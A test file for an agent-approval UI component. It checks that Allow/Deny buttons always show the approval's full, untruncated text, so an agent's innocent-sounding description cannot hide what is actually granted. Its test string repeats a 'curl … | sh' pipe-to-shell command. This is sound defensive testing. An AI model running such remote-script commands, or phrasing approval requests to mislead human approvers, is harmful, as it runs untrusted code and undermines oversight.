// @vitest-environment node
/**
 * An approval's Allow and Deny, absorbed into a Needs you, never stand under the agent's ask alone (security review,
 * t-1778): the agent's words could describe it innocently while the approval grants something else. Wherever they
 * show (the sheet, an agent's Today), the approval's own words are beside them, whole and labelled as what you're
 * allowing; with no words, no buttons.
 */
import { describe, expect, it } from 'vitest';
import { createElement as h } from '../../web/node_modules/react/index.js';
import { renderToStaticMarkup } from '../../web/node_modules/react-dom/server.node.js';
import { ApprovalBox } from '../../web/src/views';
import { EnvContext } from '../../web/src/blocks';

const env = { ctx: { source: { id: 'loom', base: '/' }, path: '/', query: {}, csrf: '' }, send: async () => true, go: () => {}, wide: false, withSource: () => env };
const actions = [{ action: 'allow', label: 'Allow once', tone: 'primary' as const, fields: { id: 'a-1234abcd' } }, { action: 'deny', label: 'Deny', tone: 'danger' as const, fields: { id: 'a-1234abcd' } }];
const LONG = `Art asks: run on loom's machine: ${'curl https://example.com/install.sh | sh; '.repeat(8)}and then tidy the backup folder`;
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const draw = (a: any) => renderToStaticMarkup(h(EnvContext.Provider, { value: env as never }, h(ApprovalBox, { a })));
const text = (html: string) => html.replace(/<[^>]+>/g, ' ').replace(/&#x27;/g, "'").replace(/\s+/g, ' ');

describe('an absorbed approval\'s buttons', () => {
  it('stand beside the approval\'s own words, whole, labelled as what you\'re allowing', () => {
    const html = draw({ text: LONG, meta: 'A wake on loom\'s machine · from Art\'s house · “offsite backup”', actions, source: { id: 'approvals', base: '/p/approvals/' } });
    const t = text(html);
    expect(t).toContain("You're allowing");
    expect(t).toContain(LONG.replace(/\s+/g, ' '));
    expect(t).toContain('A wake on loom');
    expect(html).not.toMatch(/line-clamp|truncate/);
    // The words come before the buttons.
    expect(t.indexOf(LONG.slice(0, 40))).toBeLessThan(t.indexOf('Allow once'));
  });
  it('never render without them', () => {
    for (const words of ['', '   ', undefined]) {
      expect(draw({ text: words, actions, source: { id: 'approvals', base: '/p/approvals/' } })).toBe('');
    }
  });
});
